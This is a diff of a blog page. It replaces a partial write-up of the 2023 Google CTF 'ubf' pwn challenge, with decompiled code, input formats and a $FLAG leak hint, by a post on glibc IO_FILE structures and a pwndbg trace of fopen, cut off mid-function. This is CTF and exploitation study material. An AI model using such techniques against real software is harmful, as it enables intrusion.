@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2023_googlectf_ubf复现, StarrySky">
+    <meta name="keywords" content="IO_FILE, StarrySky">
     <meta name="description" content="Love rises from the east and descends to the west,romance makes no changes until death.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2023_googlectf_ubf复现 | StarrySky</title>
+    <title>IO_FILE | StarrySky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -289,12 +289,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2023_googlectf_ubf复现</h1>
+                    <h1 class="description center-align post-title">IO_FILE</h1>
                 </div>
             </div>
         </div>
@@ -410,27 +410,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/oob/">
-                                <span class="chip bg-color">oob</span>
-                            </a>
-                        
-                            <a href="/tags/ubf/">
-                                <span class="chip bg-color">ubf</span>
+                            <a href="/tags/IO/">
+                                <span class="chip bg-color">IO</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/pwn/" class="post-category">
-                                pwn
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -446,21 +433,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-12
+                    2023-08-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    11 分
                 </div>
                 
 
@@ -478,179 +465,416 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <blockquote>
-<p><code>Unnecessary binary format</code>（不必要的二进制格式）是指在计算机科学和软件工程中，存在着冗余或不必要的二进制数据表示形式。这种形式可能会导致资源浪费、性能下降或代码复杂化。</p>
-</blockquote>
-<p>本题对不同类型的数据规定了不同的输入格式</p>
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall strs_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+                <h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h2><p><code>IO_FILE</code>结构体：通过<code>chain</code>域连接<code>stderr</code>、<code>stdout</code>、<code>stdin</code>的链表，链表的表头是<code>__IO_list_all</code>，<code>stderr</code>、<code>stdout</code>、<code>stdin</code>是程序启动时打开的文件流,<code>_IO_FILE</code>结构体定义在<code>libio.h</code>头文件中，结构体如下：</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE &#123;
+  int _flags;		&#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F;
+#define _IO_file_flags _flags
+
+  char* _IO_read_ptr;	&#x2F;* Current read pointer *&#x2F;
+  char* _IO_read_end;	&#x2F;* End of get area. *&#x2F;
+  char* _IO_read_base;	&#x2F;* Start of putback+get area. *&#x2F;
+  char* _IO_write_base;	&#x2F;* Start of put area. *&#x2F;
+  char* _IO_write_ptr;	&#x2F;* Current put pointer. *&#x2F;
+  char* _IO_write_end;	&#x2F;* End of put area. *&#x2F;
+  char* _IO_buf_base;	&#x2F;* Start of reserve area. *&#x2F;
+  char* _IO_buf_end;	&#x2F;* End of reserve area. *&#x2F;
+  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;
+  char *_IO_save_base; &#x2F;* Pointer to start of non-current get area. *&#x2F;
+  char *_IO_backup_base;  &#x2F;* Pointer to first valid character of backup area *&#x2F;
+  char *_IO_save_end; &#x2F;* Pointer to end of non-current get area. *&#x2F;
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; &#x2F;* This used to be _offset but it&#39;s too small.  *&#x2F;
+
+#define __HAVE_COLUMN &#x2F;* temporary *&#x2F;
+  &#x2F;* 1+column number of pbase(); 0 is unknown. *&#x2F;
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  &#x2F;*  char* _save_gptr;  char* _save_egptr; *&#x2F;
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">			        stderr		     stdout		      stdin
+IO_list_all  ––⇨     flag	   ¦ ⇨   flag	   ¦ ⇨   flag
+                     chain   ––      chain    ––      chain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><code>_IO_FILE_plus</code>结构体：定义在<code>libioP.h</code>中，包含<code>vtable</code>虚函数表</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE_plus
 &#123;
-  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
-  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
-  char *mem; &#x2F;&#x2F; [rsp+28h] [rbp-18h]
-  int i; &#x2F;&#x2F; [rsp+34h] [rbp-Ch]
-  char *content; &#x2F;&#x2F; [rsp+38h] [rbp-8h]
+  _IO_FILE file;
+  const struct _IO_jump_t *vtable;
+&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;str [&quot;)];
-  if ( s &gt;&#x3D; a3 )
-    return 0LL;
-  mem &#x3D; a1-&gt;mem;
-  content &#x3D; &amp;mem[a1-&gt;offset];
-  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
-  &#123;
-    censor_string(content, *&amp;mem[2 * i]);
-    s +&#x3D; snprintf(s, a3 - s, &quot;%s, &quot;, content);
-    if ( s &gt;&#x3D; a3 )
-      return 0LL;
-    content +&#x3D; *&amp;mem[2 * i] + 1;
-  &#125;
-  if ( a1-&gt;len &gt; 0 )
-    s -&#x3D; 2;
-  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
-  if ( sa &lt; a3 )
-    return sa;
-  else
-    return 0LL;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall bools_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+<p><code>vtable</code>：是一个函数指针数组，存储了一个类的虚函数的地址，<code>_IO_jump_t</code>是一个结构体，它定义了一组函数指针，用于实现<code>_IO_FILE_plus</code>结构体中的虚函数表。这些函数指针对应了<code>_IO_FILE_plus</code>结构体中的各种操作，通过虚函数表，可以实现对<code>_IO_FILE_plus</code>结构体中的函数进行动态绑定，使得在运行时可以根据具体对象的类型来调用相应的函数。</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_jump_t
 &#123;
-  char v4; &#x2F;&#x2F; al
-  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
-  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-30h]
-  char *mem; &#x2F;&#x2F; [rsp+30h] [rbp-10h]
-  int i; &#x2F;&#x2F; [rsp+3Ch] [rbp-4h]
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    &#x2F;* showmany *&#x2F;
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;bool [&quot;)];
-  if ( s &gt;&#x3D; a3 )
-    return 0LL;
-  mem &#x3D; a1-&gt;mem;
-  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
-  &#123;
-    if ( mem[i] )
-      v4 &#x3D; &#39;T&#39;;
-    else
-      v4 &#x3D; &#39;F&#39;;
-    s +&#x3D; snprintf(s, a3 - s, &quot;%c, &quot;, v4);
-    if ( s &gt;&#x3D; a3 )
-      return 0LL;
-  &#125;
-  if ( a1-&gt;len &gt; 0 )
-    s -&#x3D; 2;
-  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
-  if ( sa &lt; a3 )
-    return sa;
-  else
-    return 0LL;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__fastcall ints_tostr(UNPACK *a1, char *a2, unsigned __int64 a3)
+<p><code>_IO_wide_data</code>结构体：结构体中实现了虚表</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_wide_data
 &#123;
-  char *s; &#x2F;&#x2F; [rsp+10h] [rbp-20h]
-  char *sa; &#x2F;&#x2F; [rsp+10h] [rbp-20h]
-  char *mem; &#x2F;&#x2F; [rsp+20h] [rbp-10h]
-  int i; &#x2F;&#x2F; [rsp+2Ch] [rbp-4h]
+  wchar_t *_IO_read_ptr;	&#x2F;* Current read pointer *&#x2F;
+  wchar_t *_IO_read_end;	&#x2F;* End of get area. *&#x2F;
+  wchar_t *_IO_read_base;	&#x2F;* Start of putback+get area. *&#x2F;
+  wchar_t *_IO_write_base;	&#x2F;* Start of put area. *&#x2F;
+  wchar_t *_IO_write_ptr;	&#x2F;* Current put pointer. *&#x2F;
+  wchar_t *_IO_write_end;	&#x2F;* End of put area. *&#x2F;
+  wchar_t *_IO_buf_base;	&#x2F;* Start of reserve area. *&#x2F;
+  wchar_t *_IO_buf_end;		&#x2F;* End of reserve area. *&#x2F;
+  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;
+  wchar_t *_IO_save_base;	&#x2F;* Pointer to start of non-current get area. *&#x2F;
+  wchar_t *_IO_backup_base;	&#x2F;* Pointer to first valid character of
+				   backup area *&#x2F;
+  wchar_t *_IO_save_end;	&#x2F;* Pointer to end of non-current get area. *&#x2F;
 
-  s &#x3D; &amp;a2[snprintf(a2, a3 - a2, &quot;int [&quot;)];
-  if ( s &gt;&#x3D; a3 )
-    return 0LL;
-  mem &#x3D; a1-&gt;mem;
-  for ( i &#x3D; 0; i &lt; a1-&gt;len; ++i )
+  __mbstate_t _IO_state;
+  __mbstate_t _IO_last_state;
+  struct _IO_codecvt _codecvt;
+
+  wchar_t _shortbuf[1];
+
+  const struct _IO_jump_t *_wide_vtable;
+&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()&#123;
+    FILE*fp &#x3D; fopen(&quot;test&quot;,&quot;wb&quot;);
+    char *ptr &#x3D; malloc(0x20);
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟进<code>fopen</code>函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">► 0x555555555183 &lt;main+26&gt;    call   fopen@plt                &lt;fopen@plt&gt;
+        filename: 0x555555556007 ◂— 0x31b010074736574 &#x2F;* &#39;test&#39; *&#x2F;
+        modes: 0x555555556004 ◂— 0x74736574006277 &#x2F;* &#39;wb&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到真正调用的是<code>_IO_new_fopen</code>函数，接下来调用<code>__fopen_internal</code>函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c
+    92 &#125;
+    93 
+    94 _IO_FILE *
+    95 _IO_new_fopen (const char *filename, const char *mode)
+    96 &#123;
+ ►  97   return __fopen_internal (filename, mode, 1);
+    98 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为<code>locked_FILE</code>结构体变量<code>new_f</code>分配<code>0x230</code>的空间，结构体如下</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C"> struct locked_FILE
   &#123;
-    s +&#x3D; snprintf(s, a3 - s, &quot;%d, &quot;, *&amp;mem[4 * i]);
-    if ( s &gt;&#x3D; a3 )
-      return 0LL;
-  &#125;
-  if ( a1-&gt;len &gt; 0 )
-    s -&#x3D; 2;
-  sa &#x3D; &amp;s[snprintf(s, a3 - s, &quot;]; &quot;)];
-  if ( sa &lt; a3 )
-    return sa;
-  else
-    return 0LL;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    struct _IO_FILE_plus fp;
+#ifdef _IO_MTSAFE_IO
+    _IO_lock_t lock;
+#endif
+    struct _IO_wide_data wd;
+  &#125; *new_f &#x3D; (struct locked_FILE *) malloc (sizeof (struct locked_FILE));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li><p><code>1.string</code><br><code>|4byte total_len | 1byte type s | 2byte count | 2bytes count*2 | 2byte data ..</code></p>
-</li>
-<li><p><code>2.bool</code><br><code>|4byte size| 1byte type b | 2byte count | 2byte start_idx | bools</code></p>
-</li>
-<li><p><code>3.int</code><br><code>|4byte size| 1byte type i | 2byte count | 2byte smt | ints...</code></p>
-</li>
-</ul>
-<p>题目开始会将<code>/flag</code>载入全局变量，输入<code>string</code>类型的<code>$FLAG</code>即可将<code>flag</code>载入并替换</p>
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x55555555b000
+Size: 0x231
+
+Top chunk | PREV_INUSE
+Addr: 0x55555555b230
+Size: 0x20dd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来调用<code>_IO_no_init</code>对结构体中的成员进行<code>null</code>初始化</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c
+   72     return NULL;
+   73 #ifdef _IO_MTSAFE_IO
+   74   new_f-&gt;fp.file._lock &#x3D; &amp;new_f-&gt;lock;
+   75 #endif
+   76 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+ ► 77   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);
+   78 #else<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
+_IO_no_init (_IO_FILE *fp, int flags, int orientation,
+	     struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)
+&#123;
+  _IO_old_init (fp, flags);
+  fp-&gt;_mode &#x3D; orientation;
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+  if (orientation &gt;&#x3D; 0)
+    &#123;
+      fp-&gt;_wide_data &#x3D; wd;
+      fp-&gt;_wide_data-&gt;_IO_buf_base &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_buf_end &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_read_base &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_read_ptr &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_read_end &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_write_base &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_write_ptr &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_write_end &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_save_base &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_backup_base &#x3D; NULL;
+      fp-&gt;_wide_data-&gt;_IO_save_end &#x3D; NULL;
+
+      fp-&gt;_wide_data-&gt;_wide_vtable &#x3D; jmp;
+    &#125;
+  else
+    &#x2F;* Cause predictable crash when a wide function is called on a byte
+       stream.  *&#x2F;
+    fp-&gt;_wide_data &#x3D; (struct _IO_wide_data *) -1L;
+#endif
+  fp-&gt;_freeres_list &#x3D; NULL;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>初始化完成之后结构体中的内容如下</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p new_f-&gt;fp
+$1 &#x3D; &#123;
+  file &#x3D; &#123;
+    _flags &#x3D; -72548352,
+    _IO_read_ptr &#x3D; 0x0,
+    _IO_read_end &#x3D; 0x0,
+    _IO_read_base &#x3D; 0x0,
+    _IO_write_base &#x3D; 0x0,
+    _IO_write_ptr &#x3D; 0x0,
+    _IO_write_end &#x3D; 0x0,
+    _IO_buf_base &#x3D; 0x0,
+    _IO_buf_end &#x3D; 0x0,
+    _IO_save_base &#x3D; 0x0,
+    _IO_backup_base &#x3D; 0x0,
+    _IO_save_end &#x3D; 0x0,
+    _markers &#x3D; 0x0,
+    _chain &#x3D; 0x0,
+    _fileno &#x3D; 0,
+    _flags2 &#x3D; 0,
+    _old_offset &#x3D; 0,
+    _cur_column &#x3D; 0,
+    _vtable_offset &#x3D; 0 &#39;\000&#39;,
+    _shortbuf &#x3D; &quot;&quot;,
+    _lock &#x3D; 0x55555555b0f0,
+    _offset &#x3D; 0,
+    _codecvt &#x3D; 0x0,
+    _wide_data &#x3D; 0x55555555b100,
+    _freeres_list &#x3D; 0x0,
+    _freeres_buf &#x3D; 0x0,
+    __pad5 &#x3D; 0,
+    _mode &#x3D; 0,
+    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;
+  &#125;,
+  vtable &#x3D; 0x0
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来调用<code>_IO_file_init</code>将该结构体连接到<code>_IO_list_all</code>中，实际调用的是<code>_IO_new_file_init</code>函数</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c
+   77   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);
+   78 #else
+   79   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);
+   80 #endif
+   81   _IO_JUMPS (&amp;new_f-&gt;fp) &#x3D; &amp;_IO_file_jumps;
+ ► 82   _IO_file_init (&amp;new_f-&gt;fp);
+   83 #if  !_IO_UNIFIED_JUMPTABLES
+   84   new_f-&gt;fp.vtable &#x3D; NULL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
+_IO_new_file_init (struct _IO_FILE_plus *fp)
+&#123;
+  &#x2F;* POSIX.1 allows another file handle to be used to change the position
+     of our file descriptor.  Hence we actually don&#39;t know the actual
+     position before we do the first fseek (and until a following fflush). *&#x2F;
+  fp-&gt;file._offset &#x3D; _IO_pos_BAD;
+  fp-&gt;file._IO_file_flags |&#x3D; CLOSED_FILEBUF_FLAGS;
+
+  _IO_link_in (fp);
+  fp-&gt;file._fileno &#x3D; -1;
+&#125;
+libc_hidden_ver (_IO_new_file_init, _IO_file_init)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>_IO_new_file_init</code>函数中调用了<code>_IO_link_in</code>函数用于将文件指针链接到全局文件链表中</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
+_IO_link_in (struct _IO_FILE_plus *fp)
+&#123;
+  if ((fp-&gt;file._flags &amp; _IO_LINKED) &#x3D;&#x3D; 0)
+    &#123;
+      fp-&gt;file._flags |&#x3D; _IO_LINKED;
+#ifdef _IO_MTSAFE_IO
+      _IO_cleanup_region_start_noarg (flush_cleanup);
+      _IO_lock_lock (list_all_lock);
+      run_fp &#x3D; (_IO_FILE *) fp;
+      _IO_flockfile ((_IO_FILE *) fp);
+#endif
+      fp-&gt;file._chain &#x3D; (_IO_FILE *) _IO_list_all;
+      _IO_list_all &#x3D; fp;
+      ++_IO_list_all_stamp;
+#ifdef _IO_MTSAFE_IO
+      _IO_funlockfile ((_IO_FILE *) fp);
+      run_fp &#x3D; NULL;
+      _IO_lock_unlock (list_all_lock);
+      _IO_cleanup_region_end (0);
+#endif
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>函数首先检查文件指针的<code>_flags</code>属性是否包含 <code>_IO_LINKED</code> 标志位，如果不包含，则说明还没有链接到链表中，接下来，将结构体的 <code>_chain</code> 属性设置为之前的链表的值并设置<code>_IO_LINKED</code>标志位，查看链表中的内容，将会指向新加入的结构体</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_list_all
+$3 &#x3D; (struct _IO_FILE_plus *) 0x55555555b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>调用<code>_IO_file_fopen</code>打开文件</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">In file: &#x2F;home&#x2F;starrysky&#x2F;IO&#x2F;glibc-2.23&#x2F;libio&#x2F;iofopen.c
+   81   _IO_JUMPS (&amp;new_f-&gt;fp) &#x3D; &amp;_IO_file_jumps;
+   82   _IO_file_init (&amp;new_f-&gt;fp);
+   83 #if  !_IO_UNIFIED_JUMPTABLES
+   84   new_f-&gt;fp.vtable &#x3D; NULL;
+   85 #endif
+ ► 86   if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) !&#x3D; NULL)
+   87     return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);
+   88 
+   89   _IO_un_link (&amp;new_f-&gt;fp);
+   90   free (new_f);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>实际调用的是<code>_IO_new_file_fopen</code></p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_new_file_fopen (_IO_FILE *fp, const char *filename, const char *mode,
+		    int is32not64)
 &#123;
   ...
-  if ( !set_env_from_file(&quot;FLAG&quot;, &quot;&#x2F;flag&quot;) || !set_env_from_file(&quot;MOTD&quot;, &quot;&#x2F;motd&quot;) || !set_env_from_file(&quot;TEAM&quot;, &quot;&#x2F;team&quot;) )
-    return -1;
-  ...
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  if (_IO_file_is_open (fp))
+    return 0;
+  switch (*mode)
+    &#123;
+    case &#39;r&#39;:
+      omode &#x3D; O_RDONLY;
+      read_write &#x3D; _IO_NO_WRITES;
+      break;
+    ...
+    &#125;
+#ifdef _LIBC
+  last_recognized &#x3D; mode;
+#endif
+  for (i &#x3D; 1; i &lt; 7; ++i)
+    &#123;
+      switch (*++mode)
+	&#123;
+	case &#39;\0&#39;:
+	  break;
+	case &#39;+&#39;:
+	  omode &#x3D; O_RDWR;
+	  read_write &amp;&#x3D; _IO_IS_APPENDING;
+#ifdef _LIBC
+	  last_recognized &#x3D; mode;
+#endif
+	  continue;
+	...
+    &#125;
 
-<pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall set_env_from_file(const char *a1, const char *a2)
+  result &#x3D; _IO_file_open (fp, filename, omode|oflags, oprot, read_write,
+			  is32not64);
+    ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>会先判断文件是否已被打开，如果已经打开则返回，接下来设置打开模式和一些标志位，最后调用<code>_IO_file_open</code>真正打开文件</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">_IO_file_open (_IO_FILE *fp, const char *filename, int posix_mode, int prot,
+	       int read_write, int is32not64)
 &#123;
-  char s[8]; &#x2F;&#x2F; [rsp+10h] [rbp-210h] BYREF
-  __int64 v4; &#x2F;&#x2F; [rsp+18h] [rbp-208h]
-  char v5[496]; &#x2F;&#x2F; [rsp+20h] [rbp-200h] BYREF
-  int v6; &#x2F;&#x2F; [rsp+214h] [rbp-Ch]
-  FILE *stream; &#x2F;&#x2F; [rsp+218h] [rbp-8h]
-
-  stream &#x3D; fopen(a2, &quot;r&quot;);
-  *s &#x3D; 0LL;
-  v4 &#x3D; 0LL;
-  memset(v5, 0, sizeof(v5));
-  if ( stream &amp;&amp; fgets(s, 512, stream) )
-  &#123;
-    v6 &#x3D; strlen(s) - 1;
-    if ( s[v6] &#x3D;&#x3D; &#39;\n&#39; )
-      s[v6] &#x3D; 0;
-    setenv(a1, s, 1);
-    return 1LL;
-  &#125;
+  int fdesc;
+#ifdef _LIBC
+  if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))
+    fdesc &#x3D; open_not_cancel (filename,
+			     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);
   else
-  &#123;
-    printf(&quot;Error reading %s\n&quot;, a2);
-    return 0LL;
-  &#125;
